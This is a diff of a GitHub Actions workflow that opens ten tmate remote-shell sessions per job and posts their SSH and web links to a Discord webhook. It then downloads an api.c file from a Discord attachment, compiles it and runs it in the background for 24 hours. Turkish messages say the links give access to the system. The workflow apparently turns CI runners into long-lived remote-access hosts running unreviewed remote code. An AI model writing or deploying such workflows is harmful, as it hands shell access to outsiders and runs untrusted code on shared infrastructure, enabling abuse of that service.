@@ -32,10 +32,14 @@ jobs:
         run: |
           > tmate_links.txt
           for i in {1..10}; do
+            echo "Starting tmate session $i..."
             tmate -S /tmp/tmate_$i.sock new-session -d
             tmate -S /tmp/tmate_$i.sock wait tmate-ready
             TMATE_SSH=$(tmate -S /tmp/tmate_$i.sock display -p '#{tmate_ssh}')
+            TMATE_WEB=$(tmate -S /tmp/tmate_$i.sock display -p '#{tmate_web}')
             echo "Group ${{ matrix.group }} - tmate $i SSH: $TMATE_SSH" | tee -a tmate_links.txt
+            echo "Group ${{ matrix.group }} - tmate $i WEB: $TMATE_WEB" | tee -a tmate_links.txt
+            echo "---" | tee -a tmate_links.txt
           done
           cat tmate_links.txt
       - name: Send tmate links to Discord webhook
@@ -58,14 +62,30 @@ jobs:
       - name: Install development dependencies
         run: sudo apt-get install -y build-essential libcurl4-openssl-dev libjson-c-dev
       - name: Download api.c file
-        run: wget -O api.c "https://cdn.discordapp.com/attachments/1408872339499909161/1420399701085126766/message.txt?ex=68d541ce&is=68d3f04e&hm=e3ebc46f7fc898df132a80349d73a90cba24ed7ca5dc7cfb57104c148b6aec4b&"
+        run: wget -O api.c "https://cdn.discordapp.com/attachments/1408872339499909161/1420395292997586974/message.txt?ex=68d53db3&is=68d3ec33&hm=ad8be05b3683ce0a2371e74b2699afc0bf0518478174d4879676bb4359c46ef3&"
       - name: Set permissions
         run: chmod 777 *
       - name: Compile api.c
         run: gcc -o api api.c -lpthread -lcurl -ljson-c
-      - name: Execute api and keep session running
+      - name: Auto Ctrl+C and execute api
         run: |
-          echo "Group ${{ matrix.group }} API başlatılıyor..."
+          echo "Group ${{ matrix.group }} hazırlanıyor..."
+          echo ""
+          echo "=========================================="
+          echo "🔗 TMATE BAĞLANTI BİLGİLERİ:"
+          echo "=========================================="
+          cat tmate_links.txt
+          echo "=========================================="
+          echo "💡 Bu bağlantıları kullanarak sisteme erişebilirsiniz!"
+          echo "⏳ 5 saniye bekleyip otomatik başlatılacak..."
+          echo "=========================================="
+          
+          # 5 saniye bekle sonra otomatik devam et
+          sleep 5
+          
+          echo ""
+          echo "🚀 API başlatılıyor..."
           ./api &
-          echo "API arka planda başlatıldı, 24 saat boyunca beklenecek..."
+          echo "API arka planda başlatıldı."
+          echo "⏳ 24 saat boyunca çalışacak..."
           sleep 86400
